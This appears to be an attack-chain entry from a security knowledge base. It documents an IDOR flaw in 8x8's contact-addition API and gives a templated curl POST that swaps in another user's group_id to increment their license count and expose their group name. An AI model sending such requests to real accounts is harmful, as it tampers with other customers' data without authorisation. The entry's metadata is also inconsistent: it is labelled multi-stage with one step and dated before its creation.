---
tags:
  - idor
  - web
  - api
  - disclosure
  - license-manipulation
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-add-contact-idor]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Exploit-IDOR-in-Add-Contact-Request]]'
step_count: 1
techniques:
  - '[[Account Discovery]]'
description: >-
  An attack chain exploiting an Insecure Direct Object Reference (IDOR)
  vulnerability in the 8x8 contact addition API, allowing unauthorized
  manipulation of other users' group license counts and disclosure of group
  names.
skill_level: intermediate
impact_level: medium
id: 41132955-eedb-40c9-a72b-2e62f7da5d59
created_at: '2025-12-14T17:25:23.390Z'
updated_at: '2025-12-14T17:25:23.390Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# IDOR in 8x8 Contact Addition to Manipulate Other Users' Groups

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Authenticated Access] --> B[Exploit IDOR in API]
    B --> C[Group Manipulation and Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- None specific; standard web testing tools like curl or Burp Suite.

### Target Environment

- Web platform (8x8 API)
- Required services/ports: HTTPS (443)
- Network access requirements: Internet access to 8x8 endpoints

### Initial Access Requirements

- Authenticated user account in 8x8
- Valid session token or API credentials
- Knowledge of target user's group ID (e.g., via enumeration or guess)

## Detailed Attack Procedures

### Step 1: Exploit IDOR in Contact Addition
procedure: [[procedures/Exploit-IDOR-in-Add-Contact-Request]]

**Objective**: Modify the group identifier in the add contact API request to target another user's group, resulting in license count increment and group name disclosure.

**Instructions**: Authenticate to the 8x8 API and craft a request to add a contact, altering the group number parameter to reference another user's group. Use [[commands/curl-add-contact-idor]] to send the modified request:

```bash
curl -X POST 'https://api.8x8.com/contacts' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"contact_name": "Test Contact", "group_id": "TARGET_GROUP_ID"}'
```

Replace `YOUR_TOKEN` with your valid session token and `TARGET_GROUP_ID` with the ID of the target user's group.

**Expected Output**: API response indicating successful addition, with the targeted group's name disclosed in the response or logs, and license count incremented.

**Success Indicators**:
- Response contains the target group name
- Verification shows incremented license count for the target group
- No access granted to group contents

## Attack Chain Summary

### Key Achievements

1. Unauthorized increment of license count in another user's group
2. Disclosure of target group name via API response
3. Demonstration of IDOR without full group access

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-01*
